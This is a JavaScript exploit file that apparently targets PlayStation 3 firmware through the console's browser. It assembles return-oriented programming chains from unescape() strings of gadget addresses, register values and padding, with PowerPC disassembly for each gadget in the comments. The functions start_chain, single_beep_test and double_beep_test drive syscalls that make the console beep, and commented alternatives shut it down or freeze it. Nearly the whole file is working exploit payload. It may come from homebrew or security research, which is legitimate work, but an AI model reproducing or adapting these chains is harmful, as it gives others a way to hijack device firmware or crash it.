

//gadget =  unescape("\u7E2F\u006F\uC0F0\u7E2F"); //for DEX - libc memcpy
//gadget =  unescape("\u7E2F\u000C\u6730\u7E2F"); //for DEX - 3 beeps + shutdown
//gadget =  unescape("\u7E2F\u000C\u5234\u7E2F"); //for CEX - 3 beeps + shutdown
//gadget =  unescape("\u7E2F\u0044\uE8CC\u7E2F"); //for DEX - 3 beeps + freeze
//gadget =  unescape("\u7E2F\u0044\u6CD8\u7E2F"); //for CEX - 3 beeps + freeze

function start_chain(){


	// **************************************************************************************
	// DEX
	// execute gadget #1
	// gadget entry
	/*
	00416BF4 7C0802A6 mfspr      r0,lr
	00416BF8 F821FF91 stdu       r1,-0x70(r1)
	00416BFC F8010080 std        r0,0x80(r1) <-- link register address should be 0x8FD8D5D0
	00416C00 7C832378 mr         r3,r4
	00416C04 7CA42B78 mr         r4,r5
	00416C08 81690034 lwz        r11,0x34(r9)
	00416C0C 81490038 lwz        r10,0x38(r9)
	00416C10 80A90014 lwz        r5,0x14(r9)
	00416C14 80C90028 lwz        r6,0x28(r9)
	00416C18 80E90024 lwz        r7,0x24(r9)
	00416C1C 800B0000 lwz        r0,0x0(r11)
	00416C20 F8410028 std        r2,0x28(r1)
	00416C24 7C0903A6 mtspr      ctr,r0
	00416C28 8109002C lwz        r8,0x2C(r9)
	00416C2C 804B0004 lwz        r2,0x4(r11)
	00416C30 81290030 lwz        r9,0x30(r9)
	00416C34 4E800421 bctrl
	*/
	gadget =  unescape("\u4444\u0041\u6BF4");// r0 [gadget #1]


	// execute gadget #2
	/*
	00010B24 E80B0010 ld         r0,0x10(r11)                  03 (00010B20) REG PIPE LSU
	00010B28 7C0803A6 mtspr      lr,r0                         01 (00010B24) REG
	00010B2C EBEBFFF8 ld         r31,-0x8(r11)
	00010B30 7D615B78 mr         r1,r11
	00010B34 4E800020 blr 
	*/

	// r2 before gadget #1 <-- also used as bridge to gadget #2 after saving stack frame
	gadget =  gadget+unescape("\u0001\u0B24");// r0 [gadget #2]


	// prepare gadget #3
	gadget =  gadget+unescape("\u0073\u5F98");// r2 after gadget #1
	gadget =  gadget+unescape("\u4441\u4341\u4241\u4141");// padding


	// execute gadget #3
	/*
	0051A3A4 E80100C0 ld         r0,0xC0(r1)                    PIPE
	0051A3A8 7C6307B4 extsw      r3,r3
	0051A3AC EB810090 ld         r28,0x90(r1)
	0051A3B0 EBA10098 ld         r29,0x98(r1)
	0051A3B4 7C0803A6 mtspr      lr,r0
	0051A3B8 EBC100A0 ld         r30,0xA0(r1)
	0051A3BC EBE100A8 ld         r31,0xA8(r1)                   PIPE
	0051A3C0 382100B0 addi       r1,r1,0xB0
	0051A3C4 4E800020 blr 
	*/
	gadget =  gadget+unescape("\u0000\u0000\u0051\uA3A4");// set r0 from r11+0x10 [gadget #3]

	// padding
	gadget =  gadget+unescape("\uDDDD\uEEEE\uF111\uF222\uF333\uF444\uF555\uF666\uF777\uF888\uF999\uFAAA\uFBBB\uFCCC\uFDDD\uFEEE\uE111\uE222\uE333\uE444\uE555\uE666\uE777\uE888\uE999\uEAAA\uEBBB\uECCC\uEDDD\uEEEE\uD111\uD222\uD333\uD444\uD555\uD666\uD777\uD888\uD999\uDAAA\uDBBB\uDCCC\uDDDD\uDEEE\u4841\u4141\u4148\u4949\u4949\u4949\u4949\u4441\u4141\u4241\u4241\u4141\u4144\u5555\u5555\u5555");


	// prepare gadget #4
	gadget =  gadget+unescape("\u0000\u0000\u8020\u0280");// r28
	gadget =  gadget+unescape("\uFFFF\u0000\u0000\u1004");// r29 <-- syscall arg #1 <-- sets r3 in next gadget [set high bytes to 00000000]
	gadget =  gadget+unescape("\u0000\u0000\u8020\u0300");// r30
	gadget =  gadget+unescape("\u0000\u0000\u8020\u0310");// r31

	gadget =  gadget+unescape("\uA555\uA666\uA777\uA888\uA999\uAAAA\uABBB\uACCC");// padding


	// execute gadget #4
	/*

	006161B8 81610074 lwz        r11,0x74(r1)
	006161BC 81410078 lwz        r10,0x78(r1)                   PIPE
	006161C0 8101007C lwz        r8,0x7C(r1)
	006161C4 80E10080 lwz        r7,0x80(r1)                    PIPE
	006161C8 80C10084 lwz        r6,0x84(r1)
	006161CC 80A10088 lwz        r5,0x88(r1)                    PIPE
	006161D0 8081008C lwz        r4,0x8C(r1)
	006161D4 80610090 lwz        r3,0x90(r1)                    PIPE
	006161D8 81210094 lwz        r9,0x94(r1)
	006161DC 80010070 lwz        r0,0x70(r1)                    PIPE
	006161E0 913F0024 stw        r9,0x24(r31)
	006161E4 901F0000 stw        r0,0x0(r31)                    PIPE
	006161E8 917F0004 stw        r11,0x4(r31)
	006161EC 915F0008 stw        r10,0x8(r31)                   PIPE
	006161F0 911F000C stw        r8,0xC(r31)
	006161F4 90FF0010 stw        r7,0x10(r31)                   PIPE
	006161F8 90DF0014 stw        r6,0x14(r31)
	006161FC 90BF0018 stw        r5,0x18(r31)                   PIPE
	00616200 909F001C stw        r4,0x1C(r31)
	00616204 907F0020 stw        r3,0x20(r31)                   PIPE
	00616208 E80100D0 ld         r0,0xD0(r1)
	0061620C 7FA307B4 extsw      r3,r29
	00616210 EBC100B0 ld         r30,0xB0(r1)
	00616214 EBA100A8 ld         r29,0xA8(r1)                   PIPE
	00616218 7C0803A6 mtspr      lr,r0
	0061621C EBE100B8 ld         r31,0xB8(r1)
	00616220 382100C0 addi       r1,r1,0xC0
	00616224 4E800020 blr         
	*/
	gadget =  gadget+unescape("\u0000\u0000\u0061\u61B8");// r0 [gadget #4]

	// padding
	gadget =  gadget+unescape("\u9333\u9444\u9555\u9666\u9777\u9888\u9999\u9AAA\u9BBB\u9CCC\u9DDD\u9EEE\u8111\u8222\u8333\u8444\u8555\u8666\u8777\u8888\u8999\u8AAA\u8BBB\u8CCC\u8DDD\u8EEE\u7111\u7222\u7333\u7444\u7555\u7666\u7777\u7888\u7999\u7AAA\u7BBB\u7CCC\u7DDD\u7EEE\u6111\u6222\u6333\u6444");


	// prepare gadget #5
	gadget =  gadget+unescape("\u8020\u0000");// r0 temp
	gadget =  gadget+unescape("\u0000\u0188");// r11 <-- syscall number
	gadget =  gadget+unescape("\u8020\u0100");// r10
	gadget =  gadget+unescape("\u8020\u0080");// r8
	gadget =  gadget+unescape("\u8020\u0070");// r7
	gadget =  gadget+unescape("\u8020\u0060");// r6
	gadget =  gadget+unescape("\u0000\u01B6");// r5 <-- syscall arg #3
	gadget =  gadget+unescape("\u0000\u000A");// r4 <-- syscall arg #2
	gadget =  gadget+unescape("\u8020\u0030");// r3
	gadget =  gadget+unescape("\u8020\u0090");// r9

	gadget =  gadget+unescape("\u5BBB\u5CCC\u5DDD\u5EEE\u4111\u4222\u4333\u4444");// padding
	gadget =  gadget+unescape("\uFFFF\u0000\u0000\u1004");// r29 <-- syscall arg #1 <-- sets r3 in next gadget [set high bytes to 00000000]
	gadget =  gadget+unescape("\u0000\u0000\u8020\u0300");// r30
	gadget =  gadget+unescape("\u0000\u0000\u8020\u0310");// r31
	gadget =  gadget+unescape("\u3333\u3444\u3555\u3666\u3777\u3888\u3999\u3AAA");// padding
	
	gadget =  gadget+unescape("\u4242\u4242\u4242\u4242\u4343\u4343\u4343\u4343\u4545\u4545\u4545\u4545\u4646\u4646\u4646\u4646\u4848\u4848\u4848\u4848\u4949\u4949\u4949\u4949\u5151\u5151\u5151\u5151\u5252\u5252\u5252\u5252\u5353\u5353\u5353\u5353\u5454\u5454\u5454\u5454\u5555\u5555\u5555\u5555\u5656\u5656\u5656\u5656\u5858\u5858\u5858\u5858\u5959\u5959\u5959\u5959");
	// **************************************************************************************
}

function single_beep_test(){

	// execute gadget #5
	/*
	000DEF4C 44000002 sc                                       23 CSI PIPE
	000DEF50 E8010090 ld         r0,0x90(r1)
	000DEF54 38210080 addi       r1,r1,0x80
	000DEF58 7C0803A6 mtspr      lr,r0                         01 (000DEF50) REG
	000DEF5C 4E800020 blr 
	*/
	gadget =  gadget+unescape("\u0000\u0000\u000D\uEF4C");// r0 [gadget #5]

	gadget =  gadget+unescape("\uA222\uA333\uA444\uA555\uA666\uA666\uA444\uA333\uAAAA\uABBB\uACCC\uADDD\uA111\u3111\u3222\u3333\u3444\u3555\u3666\u3666\u3444\u3333\u3AAA\u3BBB\u3CCC\u3DDD\u3111\u4111\u4222\u4333\u4444\u4555\u4666\u4666\u4444\u4333\u4AAA\u4BBB\u4CCC\u4DDD\u4111\u6111\u6222\u6333\u6444\u6555\u6566\u6666\u6444\u6333\u6AAA\u6BBB\u6CCC\u6DDD\u6111\u6111\u6222\u6333\u6444\u6555");


	// execute gadget #6
	/*
	
	*/
	gadget =  gadget+unescape("\u0000\u0000\u0001\uDBBC");// r0
	
	gadget =  gadget+unescape("\u4242\u4242\u4242\u4242\u4343\u4343\u4343\u4343\u4545\u4545\u4545\u4545\u4646\u4646\u4646\u4646\u4848\u4848\u4848\u4848\u4949\u4949\u4949\u4949\u5151\u5151\u5151\u5151\u5252\u5252\u5252\u5252\u5353\u5353\u5353\u5353\u5454\u5454\u5454\u5454\u5555\u5555\u5555\u5555\u5656\u5656\u5656\u5656\u5858\u5858\u5858\u5858\u5959\u5959\u5959\u5959");
	// **************************************************************************************
}



function double_beep_test(){

	// execute gadget #5
	/*
	000DEF4C 44000002 sc                                       23 CSI PIPE
	000DEF50 E8010090 ld         r0,0x90(r1)
	000DEF54 38210080 addi       r1,r1,0x80
	000DEF58 7C0803A6 mtspr      lr,r0                         01 (000DEF50) REG
	000DEF5C 4E800020 blr 
	*/
	gadget =  gadget+unescape("\u0000\u0000\u000D\uEF4C");// r0 [gadget #5]

	gadget =  gadget+unescape("\uA222\uA333\uA444\uA555\uA666\uA666\uA444\uA333\uAAAA\uABBB\uACCC\uADDD\uA111\u3111\u3222\u3333\u3444\u3555\u3666\u3666\u3444\u3333\u3AAA\u3BBB\u3CCC\u3DDD\u3111\u4111\u4222\u4333\u4444\u4555\u4666\u4666\u4444\u4333\u4AAA\u4BBB\u4CCC\u4DDD\u4111\u6111\u6222\u6333\u6444\u6555\u6566\u6666\u6444\u6333\u6AAA\u6BBB\u6CCC\u6DDD\u6111\u6111\u6222\u6333\u6444\u6555");



	// execute gadget #6
	/*
	006161B8 81610074 lwz        r11,0x74(r1)
	006161BC 81410078 lwz        r10,0x78(r1)                   PIPE
	006161C0 8101007C lwz        r8,0x7C(r1)
	006161C4 80E10080 lwz        r7,0x80(r1)                    PIPE
	006161C8 80C10084 lwz        r6,0x84(r1)
	006161CC 80A10088 lwz        r5,0x88(r1)                    PIPE
	006161D0 8081008C lwz        r4,0x8C(r1)
	006161D4 80610090 lwz        r3,0x90(r1)                    PIPE
	006161D8 81210094 lwz        r9,0x94(r1)
	006161DC 80010070 lwz        r0,0x70(r1)                    PIPE
	006161E0 913F0024 stw        r9,0x24(r31)
	006161E4 901F0000 stw        r0,0x0(r31)                    PIPE
	006161E8 917F0004 stw        r11,0x4(r31)
	006161EC 915F0008 stw        r10,0x8(r31)                   PIPE
	006161F0 911F000C stw        r8,0xC(r31)
	006161F4 90FF0010 stw        r7,0x10(r31)                   PIPE
	006161F8 90DF0014 stw        r6,0x14(r31)
	006161FC 90BF0018 stw        r5,0x18(r31)                   PIPE
	00616200 909F001C stw        r4,0x1C(r31)
	00616204 907F0020 stw        r3,0x20(r31)                   PIPE
	00616208 E80100D0 ld         r0,0xD0(r1)
	0061620C 7FA307B4 extsw      r3,r29
	00616210 EBC100B0 ld         r30,0xB0(r1)
	00616214 EBA100A8 ld         r29,0xA8(r1)                   PIPE
	00616218 7C0803A6 mtspr      lr,r0
	0061621C EBE100B8 ld         r31,0xB8(r1)
	00616220 382100C0 addi       r1,r1,0xC0
	00616224 4E800020 blr 
	*/
	gadget =  gadget+unescape("\u0000\u0000\u0061\u61B8");// r0

	// padding
	gadget =  gadget+unescape("\u1111\u2222\u3333\u4444\u5555\u6666\u7777\u8888\u9999\uAAAA\uBBBB\uCCCC\uDDDD\uEEEE\uF111\uF222\uF333\uF444\uF555\uF666\uF777\uF888\uF999\uFAAA\uFBBB\uFCCC\uFDDD\uFEEE\uE111\uE222\uE333\uE444\uE555\uE666\uE777\uE888\uE999\uEAAA\uEBBB\uECCC\uEDDD\uEEEE\uD111\uD222");


	// prepare gadget #7
	gadget =  gadget+unescape("\u8020\u0000");// r0 temp
	gadget =  gadget+unescape("\u0000\u0188");// r11 <-- syscall number
	gadget =  gadget+unescape("\u8020\u0100");// r10
	gadget =  gadget+unescape("\u8020\u0080");// r8
	gadget =  gadget+unescape("\u8020\u0070");// r7
	gadget =  gadget+unescape("\u8020\u0060");// r6
	gadget =  gadget+unescape("\u0000\u01B6");// r5 <-- syscall arg #3
	gadget =  gadget+unescape("\u0000\u000A");// r4 <-- syscall arg #2
	gadget =  gadget+unescape("\u8020\u0030");// r3
	gadget =  gadget+unescape("\u8020\u0090");// r9

	gadget =  gadget+unescape("\uC999\uCAAA\uCBBB\uCCCC\uCDDD\uCEEE\uB111\uB222");// padding

	gadget =  gadget+unescape("\uFFFF\u0000\u0000\u1004");// r29 <-- syscall arg #1 <-- sets r3 in next gadget [set high bytes to 00000000]
	gadget =  gadget+unescape("\u0000\u0000\u8020\u0300");// r30
	gadget =  gadget+unescape("\u0000\u0000\u8020\u0310");// r31

	gadget =  gadget+unescape("\uA111\uA222\uA333\uA444\uA555\uA666\uA777\uA888");// padding


	// execute gadget #7
	/*
	000DEF4C 44000002 sc                                       23 CSI PIPE
	000DEF50 E8010090 ld         r0,0x90(r1)
	000DEF54 38210080 addi       r1,r1,0x80
	000DEF58 7C0803A6 mtspr      lr,r0                         01 (000DEF50) REG
	000DEF5C 4E800020 blr 
	*/
	gadget =  gadget+unescape("\u0000\u0000\u000D\uEF4C");// r0


	// padding
	gadget =  gadget+unescape("\uADDD\uAEEE\u9111\u9222\u9333\u9444\u9555\u9666\u9777\u9888\u9999\u9AAA\u9BBB\u9CCC\u9DDD\u9EEE\u8111\u8222\u8333\u8444\u8555\u8666\u8777\u8888\u8999\u8AAA\u8BBB\u8CCC\u8DDD\u8EEE\u7111\u7222\u7333\u7444\u7555\u7666\u7777\u7888\u7999\u7AAA\u7BBB\u7CCC\u7DDD\u7EEE\u6111\u6222\u6333\u6444\u6555\u6666\u6777\u6888\u6999\u6AAA\u6BBB\u6CCC\u6DDD\u6EEE\u5111\u5222");

	// prepare gadget #8



	// execute gadget #8
	/*

	*/

	//gadget =  gadget+unescape("\u0000\u0000\u0387\u3EE0");//graceful exit test #1 freeze
	//gadget =  gadget+unescape("\u0000\u0000\u03C1\u654C");//graceful exit test #2 freeze
	//gadget =  gadget+unescape("\u0000\u0000\u038C\uE218");//graceful exit test #3 
	//gadget =  gadget+unescape("\u0000\u0000\u000B\uBD7C");// graceful exit test #4 no crash using float
	//gadget =  gadget+unescape("\u0000\u0000\u0049\u5B74");// graceful exit test #5 
	//gadget =  gadget+unescape("\u0000\u0000\u038C\uE1B4");// graceful exit test #6 
	//gadget =  gadget+unescape("\u0000\u0000\u0381\u6638");// graceful exit test #7 
	//gadget =  gadget+unescape("\u0000\u0000\u038C\uE2AC");// graceful exit test #8 
	//gadget =  gadget+unescape("\u0000\u0000\u038C\uE840");// graceful exit test #9 
	//gadget =  gadget+unescape("\u0000\u0000\u0048\uFF84");// graceful exit test #10 
	//gadget =  gadget+unescape("\u0000\u0000\u000D\uEF54");// graceful exit test #11 no xmb return infinite addi r1
	//gadget =  gadget+unescape("\u0000\u0000\u000D\uF738");// graceful exit test #12
	gadget =  gadget+unescape("\u0000\u0000\u0001\uDBBC");// graceful exit test #13 no xmb return infinite usleep
	//gadget =  gadget+unescape("\u0000\u0000\u0037\uFFE4");// graceful exit test #14

	//gadget =  gadget+unescape("\u0000\u0000\uCAFE\uBABE");// r0
	
	gadget =  gadget+unescape("\u4242\u4242\u4242\u4242\u4343\u4343\u4343\u4343\u4545\u4545\u4545\u4545\u4646\u4646\u4646\u4646\u4848\u4848\u4848\u4848\u4949\u4949\u4949\u4949\u5151\u5151\u5151\u5151\u5252\u5252\u5252\u5252\u5353\u5353\u5353\u5353\u5454\u5454\u5454\u5454\u5555\u5555\u5555\u5555\u5656\u5656\u5656\u5656\u5858\u5858\u5858\u5858\u5959\u5959\u5959\u5959");
	// **************************************************************************************
}

